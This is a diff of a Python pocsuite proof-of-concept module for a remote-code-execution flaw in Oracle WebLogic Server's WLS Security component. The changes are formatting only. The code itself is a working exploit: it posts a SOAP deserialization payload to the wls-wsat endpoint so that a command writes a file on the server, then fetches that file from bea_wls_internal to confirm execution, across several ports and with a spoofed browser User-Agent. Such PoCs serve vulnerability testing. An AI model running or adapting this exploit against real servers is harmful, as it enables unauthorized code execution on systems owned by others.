@@ -8,6 +8,7 @@ from pocsuite.api.request import req
 from pocsuite.api.poc import register
 from pocsuite.api.poc import Output, POCBase
 
+
 class TestPOC(POCBase):
     vulID = '0'
     version = '1.0'
@@ -30,7 +31,8 @@ Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组�
     '''
 
     def _verify(self):
-        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0, 8))
+        flag = "".join(random.choice(string.ascii_letters)
+                       for _ in xrange(0, 8))
         output_file = '{}.txt'.format(flag)
         '''
         payload的格式化
@@ -49,51 +51,55 @@ Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组�
             </java>
             </java>
             </work:WorkContext>
-            </soapenv:Header><soapenv:Body/></soapenv:Envelope>'''.format(output_file,command_filtered)
+            </soapenv:Header><soapenv:Body/></soapenv:Envelope>'''.format(output_file, command_filtered)
             return payload_1
 
         '''
         检查结果
         '''
         def verify_result(target):
-            headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
-            #url增加时间戳避免数据是上一次的结果缓存
-            output_url = '{}/bea_wls_internal/{}?{}'.format(target,output_file,int(time.time()))
+            headers = {
+                'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
+            # url增加时间戳避免数据是上一次的结果缓存
+            output_url = '{}/bea_wls_internal/{}?{}'.format(
+                target, output_file, int(time.time()))
             try:
-                r = req.get(output_url,headers = headers)
+                r = req.get(output_url, headers=headers)
                 if r.status_code == req.codes.ok and flag in r.text:
-                    return (True,'success')
+                    return (True, 'success')
                 elif r.status_code == 404:
-                    return (False,'404 no output')
+                    return (False, '404 no output')
                 else:
-                    return (False,r.status_code)
+                    return (False, r.status_code)
             except req.exceptions.ReadTimeout:
-                return (False,'timeout')
-            except Exception,ex:
-                #raise
-                return (False,str(ex))
+                return (False, 'timeout')
+            except Exception, ex:
+                # raise
+                return (False, str(ex))
 
         '''
         RCE POC
         '''
         def weblogic_rce(target):
             url = '{}/wls-wsat/CoordinatorPortType'.format(target)
-            #content-type必须为text/xml
-            payload_header = {'content-type': 'text/xml','User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
+            # content-type必须为text/xml
+            payload_header = {'content-type': 'text/xml',
+                              'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
             try:
-                r = req.post(url, payload_command(),headers = payload_header,verify=False)
-                #500时说明已成功反序列化执行命令
+                r = req.post(url, payload_command(),
+                             headers=payload_header, verify=False)
+                # 500时说明已成功反序列化执行命令
                 if r.status_code == 500:
                     return verify_result(target)
                 elif r.status_code == 404:
-                    return (False,'404 no vulnerability')
+                    return (False, '404 no vulnerability')
                 else:
-                    return (False,'{} something went wrong'.format(r.status_code))
+                    return (False, '{} something went wrong'.format(r.status_code))
             except req.exceptions.ReadTimeout:
-                return (False,'timeout')
-            except Exception,ex:
-                #raise
-                return (False,str(ex))
+                return (False, 'timeout')
+            except Exception, ex:
+                # raise
+                return (False, str(ex))
 
         '''
         verify:
@@ -105,7 +111,7 @@ Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组�
             ports.insert(0, pr.port)
         for port in ports:
             uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
-            status,msg = weblogic_rce(uri)
+            status, msg = weblogic_rce(uri)
             if status:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = uri
@@ -123,5 +129,6 @@ Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组�
         else:
             output.fail('not vulnerability')
         return output
+
 
 register(TestPOC)
